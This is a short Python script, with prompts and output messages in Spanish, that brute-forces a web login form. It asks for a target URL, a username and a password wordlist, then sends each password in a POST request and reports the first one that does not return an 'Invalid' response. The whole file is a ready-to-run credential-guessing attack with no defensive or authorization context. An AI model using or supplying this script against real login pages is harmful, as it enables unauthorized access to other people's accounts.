import requests

def bruteforce_login(url, username, wordlist):
    with open(wordlist, "r") as f:
        passwords = f.read().splitlines()

    for password in passwords:
        data = {
            "username": username,
            "password": password
        }
        try:
            response = requests.post(url, data=data)
            if "Invalid" not in response.text and response.status_code == 200:
                print(f"[+] Contraseña encontrada: {password}")
                return
            else:
                print(f"[-] Falló: {password}")
        except Exception as e:
            print(f"[!] Error con {password}: {e}")
    print("[-] No se encontró una contraseña válida.")

if __name__ == "__main__":
    target_url = input("Introduce la URL del login: ")
    user = input("Introduce el nombre de usuario: ")
    wordlist_path = input("Ruta del diccionario de contraseñas: ")
    bruteforce_login(target_url, user, wordlist_path)
